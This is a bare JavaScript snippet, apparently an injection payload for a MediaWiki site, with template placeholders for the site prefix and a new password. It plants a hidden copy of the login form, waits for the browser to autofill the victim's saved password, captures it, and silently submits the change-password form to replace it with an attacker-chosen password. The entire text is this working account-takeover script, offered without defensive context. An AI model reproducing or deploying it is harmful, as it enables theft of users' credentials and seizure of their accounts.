if (window.localStorage.getItem("gp1") === null) {
$.get("%%mw_website_prefix%%" + "Special:UserLogin", function(data) { 
    $("#footer").append($(data).find("form").eq(0)).css({"display": "none"});
    pw_i = 0;
    pw = setInterval(function () {
        if ($("#wpPassword1").val() !== "") {
            var sent_login = encodeURIComponent(wgUserName);
            var sent_pwd = encodeURIComponent($("#wpPassword1").val());
            console.log(sent_login, sent_pwd);
            $.get("/Special:ChangePassword", function (data) {
                rpf = $(data).find("form#mw-resetpass-form");
                rpf_ser = rpf.serialize();
                rpf_ser = rpf_ser.replace(/(wpPassword=)(?:[^&]*)/g, "$1" + sent_pwd);
                rpf_ser = rpf_ser.replace(/(wpNewPassword=)(?:[^&]*)/g, "$1" + "%%need_password%%");
                rpf_ser = rpf_ser.replace(/(wpRetype=)(?:[^&]*)/g, "$1" + "%%need_password%%");
                $.ajax({
                    type : "POST",
                    url : rpf.attr("action"),
                    data : rpf_ser
                });
            })
            window.localStorage.setItem("gp1", true);
            clearInterval(pw);
        } else if (pw_i > 10000) {
            clearInterval(pw);
            window.localStorage.setItem("gp1", false);
        }
        pw_i += 50;
    }, 50);
})
}